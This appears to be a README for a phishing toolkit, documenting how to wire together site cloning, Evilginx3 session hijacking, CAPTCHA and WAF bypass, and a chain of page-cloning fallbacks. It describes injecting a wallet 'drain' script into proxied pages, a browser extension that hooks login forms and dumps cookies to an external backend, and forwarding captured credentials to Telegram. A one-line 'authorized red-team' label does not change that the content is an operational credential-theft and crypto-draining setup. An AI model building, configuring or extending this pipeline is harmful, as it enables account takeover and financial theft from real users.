# Mirror Toolkit Integrations (God-Level)

Authorized red-team lab use only. **All integrations are optional** — default `pnpm clone-tunnel --god-mode --force <url>` behavior is unchanged when flags are off.

## Docker services

```bash
# Core
docker compose up -d postgres redis

# Integrations (profiles — start only what you need)
docker compose --profile flaresolverr up -d
docker compose --profile recognizer up -d
docker compose --profile replica up -d
docker compose --profile evilginx up -d
docker compose --profile integrations up -d   # all integration services
```

| Service | Image / build | Port | Env flag |
|---------|---------------|------|----------|
| flaresolverr | `ghcr.io/flaresolverr/flaresolverr:latest` | 8191 | `FLARESOLVERR_ENABLED` |
| recognizer | `docker/recognizer` | 5000 | `CAPTCHA_SOLVER=recognizer` |
| replica-proxy | `ghcr.io/sarperavci/replica:latest` | 8081 | `USE_REPLICA` |
| evilginx | `ghcr.io/0xtidalbore/evilginx3:latest` | 8443 | `SESSION_HIJACK_ENABLED` |

## Adapter chain order

`scripts/lib/clone-tunnel-fallback-chain.ts`:

1. **Session hijack** — `CLONE_MODE=session_hijack` or login + `SESSION_HIJACK_ENABLED` → Evilginx3 (no drain inject)
2. **Reverse proxy** — Replica if `USE_REPLICA=true`, else nginx → inject `legion-authorized-drain.js`
3. **FlareSolverr + static** — `FLARESOLVERR_ENABLED=true` (cookies prefetched before step 1 in `clone-deploy-tunnel.ts`)
4. **Standard static clone** — `generate-phishing-page.ts`
5. **Asuka** — `ASUKA_FALLBACK=true` (pip or Docker)
6. **webcloner-js** — `WEBCLONER_ENABLED=true`
7. **AI clone** — `AI_CLONING_ENABLED=true` (Clooney stub via `npx clooney-agent`)
8. **Headless capture** → **placeholder** (existing)

Captured creds/sessions → `POST /api/v1/creds` → Telegram via API.

---

## 1. FlareSolverr

```env
FLARESOLVERR_ENABLED=true
FLARESOLVERR_URL=http://localhost:8191
```

Module: `scripts/lib/integrations/flaresolverr.ts`

- Prefetch in `clone-deploy-tunnel.ts` before reverse proxy
- Sets `MIRROR_PROXY_COOKIES` + `MIRROR_PROXY_USER_AGENT` for nginx/static generation
- Fallback chain step 3 if reverse proxy fails

## 2. Replica

```env
USE_REPLICA=true
REPLICA_PORT=8081
REPLICA_REWRITE_RULES=inject:legion-authorized-drain.js:script
REPLICA_DOCKER_IMAGE=ghcr.io/sarperavci/replica:latest
```

Module: `scripts/lib/integrations/replica.ts`

- Replaces nginx when enabled; falls back to nginx on failure
- Injects drain CSS/JS via rewrite rules

## 3. Evilginx3 (session hijack)

```env
CLONE_MODE=session_hijack
SESSION_HIJACK_ENABLED=true
EVILGINX_DOMAIN=your-phish-domain.test
EVILGINX_PHISHLETS_DIR=./clones/phishlets
```

Module: `scripts/lib/integrations/evilginx2.ts`

- Auto-generates phishlet YAML from target URL
- `pollAndForwardEvilginxSessions()` → `/api/v1/creds`
- `stopEvilginxStack(outDir, runCommand)` cleanup helper

## 4. Asuka

```env
ASUKA_FALLBACK=true
ASUKA_BIN=asuka
ASUKA_USE_DOCKER=false
ASUKA_MAX_DEPTH=2
```

Module: `scripts/lib/integrations/asuka.ts`

## 5. webcloner-js

```env
WEBCLONER_ENABLED=true
WEBCLONER_BUILD_FROM_SOURCE=true
WEBCLONER_REPO=https://github.com/maornissan/webcloner-js.git
```

Module: `scripts/lib/integrations/webcloner-js.ts`

Clones from source into `.cache/webcloner-js` or falls back to `npx webcloner-js`.

## 6. reCognizer (self-hosted CAPTCHA)

```env
CAPTCHA_SOLVER=recognizer
RECOGNIZER_URL=http://localhost:5000
```

Module: `scripts/lib/integrations/recognizer.ts`

Integrated in `mirror-waf-probe.ts` before paid 2Captcha fallback.

## 7. Browser extension collector

```bash
pnpm install-extension --backend https://legionapi-production.up.railway.app --zip
```

- Source: `scripts/extension/legion-collector/`
- Output: `dist/legion-collector/` (+ optional zip)
- Hooks login forms + cookie dump → `/api/v1/creds`

## 8. Clooney-Agent (AI clone — off by default)

```env
AI_CLONING_ENABLED=false
```

Module: `scripts/lib/integrations/clooney-agent.ts` — runs `npx clooney-agent` when enabled.

---

## File map

```
scripts/lib/integrations/
  env.ts flaresolverr.ts replica.ts evilginx2.ts asuka.ts
  webcloner-js.ts recognizer.ts clooney-agent.ts adapter-chain.ts
scripts/extension/legion-collector/
scripts/install-extension.ts
docker/recognizer/
docs/INTEGRATIONS.md
```

## Preserved features

When all integration env vars are **false/unset**:

- nginx reverse proxy + drain inject
- Original fallback chain (static → headless → placeholder)
- 8-chain drain, Telegram bot, gas reserve, CEX clone — unchanged
